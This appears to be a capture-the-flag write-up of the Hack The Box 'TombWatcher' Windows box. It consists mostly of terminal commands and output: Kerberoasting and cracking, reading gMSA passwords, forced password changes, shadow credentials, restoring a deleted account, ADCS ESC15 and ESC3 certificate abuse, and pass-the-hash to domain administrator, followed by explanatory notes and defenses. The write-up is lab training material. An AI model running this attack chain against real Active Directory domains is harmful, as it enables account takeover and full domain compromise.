@@ -1,0 +1,430 @@
+
+
+
+As is common in real life Windows pentests, you will start the TombWatcher box with credentials for the following account: 
+henry / H3nry_987TGV!
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# bloodhound-python -u henry -p 'H3nry_987TGV!' -d tombwatcher.htb -c all -ns 10.10.11.72 -dc dc01.tombwatcher.htb --zip
+INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
+INFO: Found AD domain: tombwatcher.htb
+INFO: Getting TGT for user
+
+
+Henry can AddSPN for alfred
+
+we can use an ldif
+
+dn: CN=ALFRED,CN=USERS,DC=TOMBWATCHER,DC=HTB
+changetype: modify
+add: servicePrincipalName
+servicePrincipalName: HTTP/alfred.tombwatcher.htb
+
+ldapmodify -x -H ldap://<DC_IP> -D "TOMBWATCHER\\henry" -w 'H3nry_987TGV!' -f add_spn.ldif
+
+
+or bloodyAD
+
+┌──(root㉿kali)-[/home/kali]
+└─# bloodyAD -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' --host dc01.tombwatcher.htb set object alfred servicePrincipalName -v 'HTTP/alfred.tombwatcher.htb'
+
+[+] alfred's servicePrincipalName has been updated
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# impacket-GetUserSPNs -request -dc-ip 10.10.11.72 tombwatcher.htb/henry:'H3nry_987TGV!' -target-domain tombwatcher.htb                           
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+ServicePrincipalName         Name    MemberOf  PasswordLastSet             LastLogon  Delegation 
+---------------------------  ------  --------  --------------------------  ---------  ----------
+HTTP/alfred.tombwatcher.htb  Alfred            2025-05-12 11:17:03.526670  <never>               
+
+
+
+[-] CCache file is not found. Skipping...
+$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$b27389676740bbc7b4ad33f5cd261e67$f530e61fd622d3de119c75688db9190b659f151b1c5e0239715da68838d2197e2c21eec8be5ccfa7bddc9b6443190ef0e677056d4fe52c71aa10c52364a4a1262e6e76d2fbb62efca1d7a1c9cc64824d185178e2ffb5cc2179fceef420118259a5c7932d57a0c1dc607ef1f2585abffe16f691f179c5ec7de323134f96e67c8cbf011e8458cf11f411fefa0976cf7f6d486b1c5b8fe0fcc74f46f3226c1a7339389ae2d93d04a0c6cdd9ccc6f54bf142484f97c259cb9a54f424798234ed399da59a2a1e2058d7bd7284f59a5e660f21c4fc59ec308e5aa818a1c0f3e1f0c66d1d35d327be8658256b4ba828b75348edd3d33bf290e4bf712bb433723cb9c657d002e1b8ee552d81e9861ea94fa4fb7acfe6c835d8bc32e4d5866ecd1cdc34efccaf6dc70620ad30b4f8cbcd5510cb65fcde6178f6f07b14220a06291cc9e5fd4bbb444700d3631dd48d9d2eeb2255e08106fd7db35e9cc68b5ca79fd6760011d65c6c5775c78125d186884b126e638e9ae12a3a1341bb1d5850c44bfbba7a5d737bbc97c8cde87820f7a31f50ff187b86e3e0f5b747ca28b4206f787daf2fc79c415038a7066510b2966df0b4e7a2d37d2adbfdda82da9d5b4c3643b8619d15562ea312e488b1429b2f143691c489ba528c7351def82108eb1285df3d34b40bbd478b9fb4f43495dc2bca68e0b7b429e9c5de2cf988f9a4b0701549274f298fd2d382bd86585aaac05bf5e04e94a98e89662b09439ba8ace9dc334c95aba61fa85523d0831b80af1eccde830f545dbb57ed8e1200ebf8eb8be283a0ba873e6aefb6c891483be247099b02ebdc1f909f0162b6f8773edd620910651c1277e57533a6fbec655c46d1e93e68b93f0b2095a07747d9c22a792ddcc4fbb6a2333d5c8ae8dce2df662b7c136d8f719ae82d659f04bc4cd5b723585b9c0abf6eca21ce639ffa7c5223e1826de34336b6bab0fc10a2c3745b43eb4977e9159fc6ad5996ce563a641ef32017b6a2a08d796f1807b183ecb92d0f5af0f814afbfd6f77a13f386e14f1b1dba3b84dc3b631845c0907f75d11a866f75783a7f1dff4d612c3d15bdf6e22dfac0f28f324b950c1036c61aa9f37f6e88402835bbbe2ba1539c418c22dc7c6b8128183be25114fb7f2746dfad2cae251708aa459bcf1079d5920d5b54dd77cac24f968d436ea72315d99f6120f60683cd80d9d397ac5f331b39503fb126db10a9c1cbc745fda1302dfe9dc0e8e1ffb159c94b91fec4d7c474639312dd16e09464adc32f1bc91b96187b1ccb546b5dafbffcdcd5fd07119bce7e588b4c1ad5adb700f534cd3e31505b318a3dd475f258a309dff17937aabdfa7889d690319ed94349f46289c4ec13b047f496f7528caa563d3ee8315b84d78a4589bb0f6a7907a945ed128d1efadb14d4820e85a25d8269fe49cb1a97e2eb0925fe6e0c5adb6c03d4aaf640c0b798a01a2fa37e6ff8f5
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# echo '$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$b27389676740bbc7b4ad33f5cd261e67$f530e61fd622d3de119c75688db9190b659f151b1c5e0239715da68838d2197e2c21eec8be5ccfa7bddc9b6443190ef0e677056d4fe52c71aa10c52364a4a1262e6e76d2fbb62efca1d7a1c9cc64824d185178e2ffb5cc2179fceef420118259a5c7932d57a0c1dc607ef1f2585abffe16f691f179c5ec7de323134f96e67c8cbf011e8458cf11f411fefa0976cf7f6d486b1c5b8fe0fcc74f46f3226c1a7339389ae2d93d04a0c6cdd9ccc6f54bf142484f97c259cb9a54f424798234ed399da59a2a1e2058d7bd7284f59a5e660f21c4fc59ec308e5aa818a1c0f3e1f0c66d1d35d327be8658256b4ba828b75348edd3d33bf290e4bf712bb433723cb9c657d002e1b8ee552d81e9861ea94fa4fb7acfe6c835d8bc32e4d5866ecd1cdc34efccaf6dc70620ad30b4f8cbcd5510cb65fcde6178f6f07b14220a06291cc9e5fd4bbb444700d3631dd48d9d2eeb2255e08106fd7db35e9cc68b5ca79fd6760011d65c6c5775c78125d186884b126e638e9ae12a3a1341bb1d5850c44bfbba7a5d737bbc97c8cde87820f7a31f50ff187b86e3e0f5b747ca28b4206f787daf2fc79c415038a7066510b2966df0b4e7a2d37d2adbfdda82da9d5b4c3643b8619d15562ea312e488b1429b2f143691c489ba528c7351def82108eb1285df3d34b40bbd478b9fb4f43495dc2bca68e0b7b429e9c5de2cf988f9a4b0701549274f298fd2d382bd86585aaac05bf5e04e94a98e89662b09439ba8ace9dc334c95aba61fa85523d0831b80af1eccde830f545dbb57ed8e1200ebf8eb8be283a0ba873e6aefb6c891483be247099b02ebdc1f909f0162b6f8773edd620910651c1277e57533a6fbec655c46d1e93e68b93f0b2095a07747d9c22a792ddcc4fbb6a2333d5c8ae8dce2df662b7c136d8f719ae82d659f04bc4cd5b723585b9c0abf6eca21ce639ffa7c5223e1826de34336b6bab0fc10a2c3745b43eb4977e9159fc6ad5996ce563a641ef32017b6a2a08d796f1807b183ecb92d0f5af0f814afbfd6f77a13f386e14f1b1dba3b84dc3b631845c0907f75d11a866f75783a7f1dff4d612c3d15bdf6e22dfac0f28f324b950c1036c61aa9f37f6e88402835bbbe2ba1539c418c22dc7c6b8128183be25114fb7f2746dfad2cae251708aa459bcf1079d5920d5b54dd77cac24f968d436ea72315d99f6120f60683cd80d9d397ac5f331b39503fb126db10a9c1cbc745fda1302dfe9dc0e8e1ffb159c94b91fec4d7c474639312dd16e09464adc32f1bc91b96187b1ccb546b5dafbffcdcd5fd07119bce7e588b4c1ad5adb700f534cd3e31505b318a3dd475f258a309dff17937aabdfa7889d690319ed94349f46289c4ec13b047f496f7528caa563d3ee8315b84d78a4589bb0f6a7907a945ed128d1efadb14d4820e85a25d8269fe49cb1a97e2eb0925fe6e0c5adb6c03d4aaf640c0b798a01a2fa37e6ff8f5'>hash
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+basketball       (?)     
+1g 0:00:00:00 DONE (2025-10-26 19:59) 50.00g/s 51200p/s 51200c/s 51200C/s 123456..bethany
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+Alfred can AddSelf to Infrastructure
+
+┌──(root㉿kali)-[/home/kali]
+└─# bloodyAD -d tombwatcher.htb -u alfred -p basketball --host dc01.tombwatcher.htb add groupMember Infrastructure alfred
+[+] alfred added to Infrastructure
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+
+
+Infrastructure can ReadGMSAPAssword of Ansible_DEV$
+
+two ways to do this easily.
+
+┌──(root㉿kali)-[/home/kali]
+└─# bloodyAD -d tombwatcher.htb -u alfred -p basketball --host dc01.tombwatcher.htb get object 'ANSIBLE_DEV$' --attr msDS-ManagedPassword
+
+
+distinguishedName: CN=ansible_dev,CN=Managed Service Accounts,DC=tombwatcher,DC=htb
+msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:bf8b11e301f7ba3fdc616e5d4fa01c30
+msDS-ManagedPassword.B64ENCODED: hTHfon3m4u5bkUTSlOKiTcVGqaIiYqe4SrrDZd8uUEmyGMin8X1qKy6L5ZHVlsvRp17h6l5hC0OqLxYV/WGcmmGom+hqBklNY+MSgPO2r8SUnGniBbV3VR2C6pak3TJxRHd+4yb8iNDsLLgEG/goJ8yVoaaYpQppZWEOtE9EvQLV0nYjWoReut1xHZ1QP/kmHL6hOGrASDo2FIgXRQmEzjyatED/Zdz7s3mfB3OuOWxQUiyd4tic2RFKHEjurhJXN8iuVh0jPJzyWqEiF+5+ZYDckA52ICoIN9JhyAxH3R6Ftqjok3Xc524zjHBiE3Fb7ZMBtNkjobLCxW3976E1yw==
+                                        
+┌──(root㉿kali)-[/home/kali]
+└─# netexec ldap dc01.tombwatcher.htb -u alfred -p basketball --gmsa
+LDAP        10.10.11.72     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb)
+LDAPS       10.10.11.72     636    DC01             [+] tombwatcher.htb\alfred:basketball 
+LDAPS       10.10.11.72     636    DC01             [*] Getting GMSA Passwords
+LDAPS       10.10.11.72     636    DC01             Account: ansible_dev$         NTLM: bf8b11e301f7ba3fdc616e5d4fa01c30     PrincipalsAllowedToReadPassword: Infrastructure
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+Ansible_DEV$ can ForceChangePassword Sam
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# bloodyAD -d tombwatcher.htb -u 'ANSIBLE_DEV$' -p :bf8b11e301f7ba3fdc616e5d4fa01c30 --host dc01.tombwatcher.htb set password sam 'NewPassword123!'
+[+] Password changed successfully!
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+Sam can WriteOwner John
+
+┌──(root㉿kali)-[/home/kali]
+└─# bloodyAD -d tombwatcher.htb -u sam -p 'NewPassword123!' --host dc01.tombwatcher.htb set owner john sam
+[+] Old owner S-1-5-21-1392491010-1358638721-2126982587-512 is now replaced by sam on john
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# bloodyAD -d tombwatcher.htb -u sam -p 'NewPassword123!' --host dc01.tombwatcher.htb add genericAll john sam
+[+] sam has now GenericAll on john
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# bloodyAD -d tombwatcher.htb -u sam -p 'NewPassword123!' --host dc01.tombwatcher.htb set password john 'AnotherPassword123!'
+[+] Password changed successfully!
+                                                                                                                     
+but its better to get the hash instead.
+
+┌──(root㉿kali)-[/home/kali]
+└─# certipy-ad shadow auto -target dc01.tombwatcher.htb -u sam -p 'NewPassword123!' -account john
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[!] DNS resolution failed: The DNS query name does not exist: dc01.tombwatcher.htb.
+[!] Use -debug to print a stacktrace
+[*] Targeting user 'john'
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID 'e3b3316a-1404-bea3-f947-9258aafa7bfe'
+[*] Adding Key Credential with device ID 'e3b3316a-1404-bea3-f947-9258aafa7bfe' to the Key Credentials for 'john'
+[*] Successfully added Key Credential with device ID 'e3b3316a-1404-bea3-f947-9258aafa7bfe' to the Key Credentials for 'john'
+[*] Authenticating as 'john' with the certificate
+[*] Certificate identities:
+[*]     No identities found in this certificate
+[*] Using principal: 'john@tombwatcher.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'john.ccache'
+[*] Wrote credential cache to 'john.ccache'
+[*] Trying to retrieve NT hash for 'john'
+[*] Restoring the old Key Credentials for 'john'
+[*] Successfully restored the old Key Credentials for 'john'
+[*] NT hash for 'john': 318ef485bed8f0acd34e4e1bf646a8c0
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+
+John has GenericAll over ADCS
+
+There is nothing in there, no users in the group, nothing. 
+We look for deleted objects/users
+
+*Evil-WinRM* PS C:\Users\john\Documents> Get-ADOptionalFeature 'Recycle Bin Feature'
+
+
+DistinguishedName  : CN=Recycle Bin Feature,CN=Optional Features,CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=tombwatcher,DC=htb
+EnabledScopes      : {CN=Partitions,CN=Configuration,DC=tombwatcher,DC=htb, CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=tombwatcher,DC=htb}
+FeatureGUID        : 766ddcd8-acd0-445e-f3b9-a7f9b6744f2a
+FeatureScope       : {ForestOrConfigurationSet}
+IsDisableable      : False
+Name               : Recycle Bin Feature
+ObjectClass        : msDS-OptionalFeature
+ObjectGUID         : 907469ef-52c5-41ab-ad19-5fdec9e45082
+RequiredDomainMode :
+RequiredForestMode : Windows2008R2Forest
+
+
+
+*Evil-WinRM* PS C:\Users\john\Documents> Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property objectSid,lastKnownParent
+
+
+Deleted           : True
+DistinguishedName : CN=cert_admin\0ADEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3,CN=Deleted Objects,DC=tombwatcher,DC=htb
+LastKnownParent   : OU=ADCS,DC=tombwatcher,DC=htb
+Name              : cert_admin
+                    DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
+ObjectClass       : user
+ObjectGUID        : f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
+objectSid         : S-1-5-21-1392491010-1358638721-2126982587-1109
+
+Deleted           : True
+DistinguishedName : CN=cert_admin\0ADEL:c1f1f0fe-df9c-494c-bf05-0679e181b358,CN=Deleted Objects,DC=tombwatcher,DC=htb
+LastKnownParent   : OU=ADCS,DC=tombwatcher,DC=htb
+Name              : cert_admin
+                    DEL:c1f1f0fe-df9c-494c-bf05-0679e181b358
+ObjectClass       : user
+ObjectGUID        : c1f1f0fe-df9c-494c-bf05-0679e181b358
+objectSid         : S-1-5-21-1392491010-1358638721-2126982587-1110
+
+Deleted           : True
+DistinguishedName : CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb
+LastKnownParent   : OU=ADCS,DC=tombwatcher,DC=htb
+Name              : cert_admin
+                    DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
+ObjectClass       : user
+ObjectGUID        : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
+objectSid         : S-1-5-21-1392491010-1358638721-2126982587-1111
+
+*Evil-WinRM* PS C:\Users\john\Documents> 
+
+we look for certs and get an additional hint.
+
+[!] Failed to lookup object with SID 'S-1-5-21-1392491010-1358638721-2126982587-1111'
+
+WebServer template
+
+*Evil-WinRM* PS C:\Users\john\Documents> Restore-ADObject -Identity 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
+*Evil-WinRM* PS C:\Users\john\Documents> Get-ADUser cert_admin
+
+
+DistinguishedName : CN=cert_admin,OU=ADCS,DC=tombwatcher,DC=htb
+Enabled           : True
+GivenName         : cert_admin
+Name              : cert_admin
+ObjectClass       : user
+ObjectGUID        : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
+SamAccountName    : cert_admin
+SID               : S-1-5-21-1392491010-1358638721-2126982587-1111
+Surname           : cert_admin
+UserPrincipalName :
+
+
+
+*Evil-WinRM* PS C:\Users\john\Documents> Set-ADAccountPassword cert_admin -NewPassword (ConvertTo-SecureString 'Password1!' -AsPlainText -Force)
+
+┌──(root㉿kali)-[/home/kali]
+└─# certipy-ad find -u cert_admin -p Password1! -dc-ip 10.10.11.72 -vulnerable -enabled -stdout
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 33 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 11 enabled certificate templates
+[*] Finding issuance policies
+[*] Found 13 issuance policies
+[*] Found 0 OIDs linked to templates
+[*] Retrieving CA configuration for 'tombwatcher-CA-1' via RRP
+[*] Successfully retrieved CA configuration for 'tombwatcher-CA-1'
+[*] Checking web enrollment for CA 'tombwatcher-CA-1' @ 'DC01.tombwatcher.htb'
+[!] Error checking web enrollment: timed out
+[!] Use -debug to print a stacktrace
+[*] Enumeration output:
+Certificate Authorities
+  0
+    CA Name                             : tombwatcher-CA-1
+    DNS Name                            : DC01.tombwatcher.htb
+    Certificate Subject                 : CN=tombwatcher-CA-1, DC=tombwatcher, DC=htb
+    Certificate Serial Number           : 3428A7FC52C310B2460F8440AA8327AC
+    Certificate Validity Start          : 2024-11-16 00:47:48+00:00
+    Certificate Validity End            : 2123-11-16 00:57:48+00:00
+    Web Enrollment
+      HTTP
+        Enabled                         : False
+      HTTPS
+        Enabled                         : False
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
+    Permissions
+      Owner                             : TOMBWATCHER.HTB\Administrators
+      Access Rights
+        ManageCa                        : TOMBWATCHER.HTB\Administrators
+                                          TOMBWATCHER.HTB\Domain Admins
+                                          TOMBWATCHER.HTB\Enterprise Admins
+        ManageCertificates              : TOMBWATCHER.HTB\Administrators
+                                          TOMBWATCHER.HTB\Domain Admins
+                                          TOMBWATCHER.HTB\Enterprise Admins
+        Enroll                          : TOMBWATCHER.HTB\Authenticated Users
+Certificate Templates
+  0
+    Template Name                       : WebServer
+    Display Name                        : Web Server
+    Certificate Authorities             : tombwatcher-CA-1
+    Enabled                             : True
+    Client Authentication               : False
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : True
+    Certificate Name Flag               : EnrolleeSuppliesSubject
+    Extended Key Usage                  : Server Authentication
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Schema Version                      : 1
+    Validity Period                     : 2 years
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Template Created                    : 2024-11-16T00:57:49+00:00
+    Template Last Modified              : 2024-11-16T17:07:26+00:00
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
+                                          TOMBWATCHER.HTB\Enterprise Admins
+                                          TOMBWATCHER.HTB\cert_admin
+      Object Control Permissions
+        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
+        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
+                                          TOMBWATCHER.HTB\Enterprise Admins
+        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
+                                          TOMBWATCHER.HTB\Enterprise Admins
+        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
+                                          TOMBWATCHER.HTB\Enterprise Admins
+        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
+                                          TOMBWATCHER.HTB\Enterprise Admins
+                                          TOMBWATCHER.HTB\cert_admin
+    [+] User Enrollable Principals      : TOMBWATCHER.HTB\cert_admin
+    [!] Vulnerabilities
+      ESC15                             : Enrollee supplies subject and schema version is 1.
+    [*] Remarks
+      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# certipy-ad req -u cert_admin -p Password1! -dc-ip 10.10.11.72 -ca tombwatcher-CA-1 -template WebServer -upn cert_admin@tombwatcher.htb -application-policies 'Certificate Request Agent' -out agent.pfx
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Request ID is 8
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'cert_admin@tombwatcher.htb'
+[*] Certificate has no object SID
+[*] Try using -sid to set the object SID or see the wiki for more details
+[*] Saving certificate and private key to 'agent.pfx'
+[*] Wrote certificate and private key to 'agent.pfx'
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# certipy-ad req -u cert_admin -p Password1! -dc-ip 10.10.11.72 -ca tombwatcher-CA-1 -template User -pfx agent.pfx -on-behalf-of 'tombwatcher\Administrator'
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Request ID is 9
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'Administrator@tombwatcher.htb'
+[*] Certificate object SID is 'S-1-5-21-1392491010-1358638721-2126982587-500'
+[*] Saving certificate and private key to 'administrator.pfx'
+File 'administrator.pfx' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
+[*] Wrote certificate and private key to 'administrator.pfx'
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+###################################################################################################
+# Technical Notes: Advanced ADCS Abuse, ESC15, and ESC3 Chaining (TombWatcher Endgame)
+###################################################################################################
+
+## ADCS, ESC15, and Certificate Request Agent Abuse
+
+### Why This Works:
+- **ADCS (Active Directory Certificate Services)** is a common escalation vector in modern AD environments. If a template is misconfigured (e.g., EnrolleeSuppliesSubject=TRUE, SchemaVersion=1), and the CA is unpatched (CVE-2024-49019), an attacker can inject arbitrary EKUs (application policies) into a certificate request. This is ESC15 ("EKUwu").
+- **ESC15** allows you to request a certificate for any user (e.g., Administrator) and add the "Certificate Request Agent" EKU, even if the template does not natively allow it. This is possible because the CA does not properly restrict EKUs when EnrolleeSuppliesSubject is set and the template is v1.
+- **Certificate Request Agent** is a special EKU that allows the holder to request certificates "on behalf of" other users (ESC3). This is a powerful privilege, as it enables you to impersonate any user for certificate-based authentication.
+
+### Attack Chain Nuances:
+1. **Request a Certificate with Certificate Request Agent EKU:**
+   - You request a certificate for yourself (cert_admin) using the vulnerable template, injecting the Certificate Request Agent EKU. This is only possible due to ESC15.
+   - The resulting certificate (agent.pfx) can now be used to request certificates for other users (ESC3 abuse).
+
+2. **On-Behalf-Of Certificate Request (ESC3):**
+   - Using the agent.pfx, you request a "User" template certificate for Administrator, specifying the on-behalf-of flag. This leverages the Certificate Request Agent privilege.
+   - The CA issues a certificate for Administrator, which can be used for full authentication (Kerberos, LDAP, etc.).
+
+3. **Authentication and Hash Extraction:**
+   - With the Administrator certificate, you can use certipy-ad to obtain a TGT and extract the NT hash for Administrator, achieving full domain compromise.
+
+### Key Technical Points:
+- **Why not just request a "Client Authentication" certificate for Administrator?**
+  - If the template does not have the Client Authentication EKU, the CA will not issue a certificate valid for Kerberos logon. ESC15 allows you to inject EKUs, but some CAs may still restrict usage. The Certificate Request Agent EKU is more reliably abusable for chaining to ESC3.
+- **Why did some requests fail with CERT_E_WRONG_USAGE or rpc_s_access_denied?**
+  - These errors occur if the certificate used for on-behalf-of does not have the correct EKU, or if the template/CA restricts who can perform these actions. The correct chain is: get a cert with Certificate Request Agent EKU (via ESC15), then use that for on-behalf-of requests.
+- **Why is Schema Version 1 important?**
+  - Only v1 templates are vulnerable to ESC15. Later schema versions restrict EKU injection.
+- **Why does EnrolleeSuppliesSubject matter?**
+  - This flag allows the requester to specify arbitrary subject/UPN/EKU fields, which is the root of the ESC15 vulnerability.
+- **Why is the CA patch level critical?**
+  - The November 2024 patch (CVE-2024-49019) fixes this by preventing arbitrary EKU injection. Unpatched CAs are vulnerable.
+
+### Detection and Defense:
+- Monitor for certificate requests with unusual EKUs or on-behalf-of usage.
+- Restrict who can enroll in sensitive templates and who can act as Certificate Request Agent.
+- Patch ADCS servers to prevent ESC15.
+- Regularly audit template permissions and CA configuration.
+
+### References:
+- https://github.com/ly4k/Certipy/wiki/ESC15
+- https://github.com/ly4k/Certipy/wiki/ESC3
+- https://www.trustedsec.com/blog/ekuwu-esc15/
+- https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf
+
+###################################################################################################
+└─# certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.72
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'Administrator@tombwatcher.htb'
+[*]     Security Extension SID: 'S-1-5-21-1392491010-1358638721-2126982587-500'
+[*] Using principal: 'administrator@tombwatcher.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'administrator.ccache'
+File 'administrator.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
+[*] Wrote credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@tombwatcher.htb': aad3b435b51404eeaad3b435b51404ee:f61db423bebe3328d33af26741afe5fc
+
+                 
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# evil-winrm -i dc01.tombwatcher.htb -u administrator -H f61db423bebe3328d33af26741afe5fc
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+tombwatcher\administrator
+
+
+
+
+
